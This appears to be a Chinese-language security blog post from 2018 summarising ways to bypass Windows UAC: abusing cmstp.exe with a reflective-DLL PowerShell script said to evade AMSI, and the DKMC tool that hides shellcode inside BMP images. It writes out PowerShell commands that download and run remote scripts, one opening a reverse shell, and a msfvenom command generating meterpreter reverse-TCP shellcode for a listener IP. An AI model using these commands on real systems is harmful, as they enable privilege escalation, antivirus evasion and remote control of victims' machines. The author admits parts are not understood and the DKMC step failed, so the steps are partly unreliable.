---
layout:     post
title:      Bypass UAC的一些总结
date:       2018-12-16
author:     Wh0ale
header-img: img/wallhaven-326425.jpg
catalog: true
tags:
    - Bypass UAC
---

这几天看到的bypass 方法比较多，趁今天有空做个总结

一、利用microsoft的 “cmstp.exe”作为绕过UAC

其主要原理采用c#生成带有dll反射的的powershell脚本，amsi检测不到

关于amsi的文章参考：

<https://xz.aliyun.com/t/3095>

这里的文件编译号生成为dll文件

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehrf4diqj211z09oq5i.jpg)

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvgal9qj20z10eejt9.jpg)

执行即可弹出administrator的命令行

另附自动化脚本放在附件里

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvqrnfsj211y0kb43g.jpg)

这里看到与表哥复现

通过远程iex下载我们的执行命令脚本

生成一个一个直接执行命令的exe

①

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://InvokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] 
```



②

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.211.179:80/a'))" 
```



但是如何修改代码生成可执行命令的exe和脚本，还没弄懂  有时间大佬可以研究研究

二、DKMC

使用方法：

(gen) Generate a malicious BMP image //创建一张恶意BMP格式的图片 

(web) Start a web server and deliver malicious image //启动web服务（内置）并传送恶意图片 

(ps) Generate Powershell payload //创建Powershell 有效载荷 

(sc) Generate shellcode from raw file //从原始文件生成shellcode 

(exit) Quit the application //退出

生成shellcode
kali ip： 192.168.0.107

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=9999 -f raw  > /opt/shellcode
```



![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvz10mtj20iv0jv40n.jpg)
DKMC生成shellcode
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehw5aawkj20j00jp76v.jpg)
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwb3qxvj20jc0kfacq.jpg)
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwg1wxij20iw05i74x.jpg)
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwk95jjj20jc0kfn01.jpg)
![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwohiwyj20jc0kfq6b.jpg)
这个之前尝试是可以弹shell的，今天不知道为啥不行.....我改天再试试看，原理就是把shellcode放入bmp文件中	